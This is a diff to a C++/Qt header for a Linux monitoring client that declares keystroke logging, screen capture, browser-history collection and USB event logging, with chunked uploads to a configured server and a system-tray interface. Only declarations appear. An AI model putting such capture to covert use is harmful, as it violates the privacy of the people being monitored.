@@ -3,6 +3,10 @@
 
 #include <QObject>
 #include <QTimer>
+#include <functional>
+#include <atomic>
+
+#include <QPair>
 #include <QNetworkAccessManager>
 #include <QNetworkReply>
 #include <QJsonArray>
@@ -23,7 +27,6 @@
 #include <QProcess>
 #include <QDateTime>
 #include <QTimeZone>
-#include <QMutex>
 #include <QEventLoop>
 #include <QStorageInfo>
 #include <QNetworkInterface>
@@ -33,6 +36,7 @@
 #include <QSystemTrayIcon>
 #include <QMenu>
 #include <QAction>
+#include <QList>
 #include <QIcon>
 #include <libudev.h>
 #include <qchar.h>
@@ -48,6 +52,9 @@ public:
     MonitorClient();
     ~MonitorClient();
 
+    /// Brief notification when a second process tried to start (single-instance IPC).
+    void notifyRunningInstance();
+
 public slots:
     int getScreen();
     int sendTic();
@@ -56,7 +63,6 @@ public slots:
     int sendUSBLogs();
     void handleKeyPress(QString timestamp, const QString &windowTitle, const QString &keyText);
     void handleUsbEvent();
-    void run();
     void enableScreenshot(bool enabled);
     void enableKeylog(bool enabled);
     void enableBrowserHistory(bool enabled);
@@ -70,6 +76,9 @@ public slots:
     void onTestConnectionAction();
     void onTestAPIEndpointsAction();
     void onConfigRefreshAction();
+
+private slots:
+    void monitorTimerTick();
 
 signals:
     void screen();
@@ -85,7 +94,13 @@ private:
     void processUsbEvent(struct udev_device* dev);
     void grabEntireDesktop(QString path, QPixmap& res, bool& ok);
     void grabScreen(QString filePath, bool& ok);
-    int sendScreens(QString filePath);
+    void sendScreensAsync(const QString &filePath, std::function<void(int)> onDone);
+    void sendDataChunkAsync(const QString &serverIP, int serverPort,
+                            const QString &eventType, const QString &dataField,
+                            const QString &data, std::function<void(int)> onDone);
+    void continueSendKeyLogs(int index, QList<QList<QJsonObject>> chunks);
+    void continueSendUsbLogs(int index, QList<QList<QJsonObject>> chunks);
+    void continueSendBrowserChunks(int index, QList<QList<QJsonObject>> chunks);
     void getStorageDevices();
     void setupUsbMonitoring();
     void cleanupUsbMonitoring();
@@ -109,12 +124,12 @@ private:
     qint64 getLastCheckedTime(const QString& browserName);
     QString getFieldNameForVisitTime(const QString& browserName);
     void getVivaldiHistory();
-    int sendDataChunk(const QString& serverIP, int serverPort, const QString& eventType, const QString& dataField, const QString& data);
     bool isInterruptionRequested();
     int checkActiveScreen();
     
     // Configuration management
-    void fetchConfigurationFromAPI();
+    void fetchConfigurationFromAPI(bool showTrayProgress = false);
+    void uploadPendingBrowserHistories();
     void updateConfiguration(const QJsonObject& config);
     void manualConfigRefresh();
     
@@ -123,8 +138,12 @@ private:
     void cleanupSystemTray();
     void updateTrayIcon();
     void updateTrayMenu();
+    void setTrayActivity(const QString &shortMessage);
+    void clearTrayActivity();
     void showConnectionError(const QString& error);
-    bool testServerConnection();
+    void scheduleConnectionTest(const QString &busyMessage = QString(),
+                                std::function<void(bool)> onFinished = nullptr);
+    QPair<bool, QString> evaluateRemoteServer();
     void updateStatusDisplay();
     QString formatLastSentTime(const QDateTime& time);
     QString getLocalIPAddress();
@@ -146,6 +165,7 @@ private:
     bool isConfigUpdating;
     QDateTime lastConfigUpdate;
     QTimer *configTimer;
+    QTimer *monitorTimer;
     
     // USB monitoring
     struct udev *udev;
@@ -166,9 +186,10 @@ private:
     QNetworkAccessManager *networkManager;
     
     // System tray
-    QSystemTrayIcon *trayIcon;
-    QMenu *trayMenu;
-    QAction *statusAction;
+    QSystemTrayIcon *trayIcon = nullptr;
+    QMenu *trayMenu = nullptr;
+    /// Status lines inserted above `screenshotAction` (parent `trayMenu`; cleared on each update).
+    QList<QAction *> trayStatusDynamicActions;
     QAction *sendAllAction;
     QAction *configureAction;
     QAction *screenshotAction;
@@ -191,6 +212,7 @@ private:
     QDateTime lastUsbSentTime;
     QDateTime lastBrowserSentTime;
     QDateTime lastScreenshotSentTime;
+    QDateTime lastTicSentTime;
     
     // Connection error tracking
     bool connectionErrorNotified;
@@ -200,6 +222,16 @@ private:
 
     // Wayland screen capture via xdg-desktop-portal + PipeWire
     ScreenCastPortal *screenCastPortal;
+
+    QString m_trayActivity;
+
+    qint64 m_lastEmitTicTime;
+    qint64 m_lastEmitHistoryTime;
+    qint64 m_lastEmitScreenshotTime;
+    qint64 m_lastEmitKeyLogTime;
+    qint64 m_lastEmitUsbLogTime;
+
+    std::atomic<bool> m_browserHistoryBusy;
 };
 
-#endif // MONITORCLIENT_H 
+#endif // MONITORCLIENT_H
